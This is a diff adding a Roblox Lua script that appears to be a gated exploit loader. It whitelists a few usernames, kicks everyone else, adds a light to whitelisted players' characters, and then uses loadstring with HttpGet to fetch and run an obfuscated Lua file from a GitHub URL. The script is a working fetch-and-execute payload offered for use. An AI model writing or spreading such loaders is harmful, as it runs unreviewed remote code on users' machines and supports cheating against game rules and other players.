@@ -1,0 +1,32 @@
+local Whitelist = {
+	["Guesttheguest234"] = true,
+	["vuivuiviu2"] = true,
+	["vuivuiviu3"] = true,
+    ["wxxTYazjjtg"] = true,
+    ["iamproalt576667"] = true,
+    ["iampro576672"] = true,
+}
+
+local player = game:GetService("Players").LocalPlayer
+
+if Whitelist[player.Name] then
+task.spawn(function() 
+	local Players = game:GetService("Players")
+
+local player = Players.LocalPlayer
+local character = player.Character or player.CharacterAdded:Wait()
+local hrp = character:WaitForChild("HumanoidRootPart")
+
+local light = Instance.new("PointLight")
+light.Range = 10
+light.Brightness = 1
+light.Color = Color3.fromRGB(255, 255, 255)
+light.Parent = hrp
+
+task.spawn(function() 
+loadstring(game:HttpGet("https://raw.githubusercontent.com/NTTTTTTTT/upload/refs/heads/main/content/26e04672ebf5403c8492cebab42c79dd_obf.lua",true))()
+end) 
+end) 
+else
+	game:GetService("Players").LocalPlayer:Kick("You don't have access to this script.")
+end
